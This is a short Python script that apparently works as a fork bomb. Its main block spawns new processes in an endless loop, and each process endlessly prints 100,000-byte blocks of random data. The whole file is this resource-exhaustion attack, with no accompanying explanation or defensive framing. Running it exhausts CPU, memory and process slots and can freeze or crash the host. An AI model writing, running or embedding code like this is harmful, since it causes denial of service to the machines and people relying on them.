import multiprocessing
import secrets


def spam():
    while True:
        byte = secrets.token_bytes(100000)
        print(byte)

if __name__ == "__main__":
    while True:
        p = multiprocessing.Process(target=spam)
        p.start()
